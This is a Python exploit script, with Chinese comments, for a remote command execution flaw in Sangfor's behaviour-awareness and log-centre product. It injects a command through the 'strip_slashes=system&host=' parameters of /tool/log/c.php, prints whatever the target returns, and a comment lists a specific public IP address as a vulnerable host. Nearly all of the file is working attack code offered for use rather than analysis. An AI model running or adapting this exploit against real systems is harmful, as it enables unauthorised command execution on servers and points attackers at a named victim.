#!/usr/bin/python3
# -*- coding：utf-8 -*-
#深信服行为感知系统&&日志中心 远程命令执行漏洞
#存在漏洞地址：https://111.160.167.146:8888/

import requests
requests.packages.urllib3.disable_warnings()
import sys,colorama
from colorama import *
init(autoreset=True)

def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+      深信服行为感知系统&&日志中心 远程命令执行漏洞                +')
    print(colorama.Fore.GREEN +'+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+ EXP: python3 深信服行为感知系统&&日志中心 远程命令执行漏洞.py https://1.1.1.1:8443          +')
    print(colorama.Fore.GREEN +'+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN +'+ 请输入url-格式为:1.1.1.1:8443                          +')

import requests
requests.packages.urllib3.disable_warnings()


def run(ip,port):
    urllist = 'https://{}:{}'.format(ip, port)
    cmdsr = 'id'
    url = urllist+'/tool/log/c.php?strip_slashes=system&host=netstat -ano'
    # 打印风险地址
    print('vuln_url:{}'.format(url))
    try:
        cmdshow = requests.get(url=url,verify=False,timeout=50)
        cmdshowlist =  cmdshow.text
    except:
        print("[-] Target Not 深信服行为感知系统&&日志中心 远程命令执行漏洞  Vuln")
        return False
    else:
        if 'TCP' in cmdshow.text:
            print(colorama.Fore.YELLOW +'------------------------------执行结果----------------------------------\n')
            print(colorama.Fore.RED +'{} '.format(cmdshow.text))
            print(colorama.Fore.YELLOW + '------------------------------------------------------------------------\n')
            return True
        else:
            print(" 深信服行为感知系统&&日志中心 远程命令执行漏洞 isn't exist")
            return False
        

if __name__ == '__main__':
    #print('------------------------------------------------------------------------\n')
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = int(target.split(':')[1])
    result = run(ip, port)
    # 打印验证结果
    if result:
        print('Exist')
    else:
        print('UnExist')
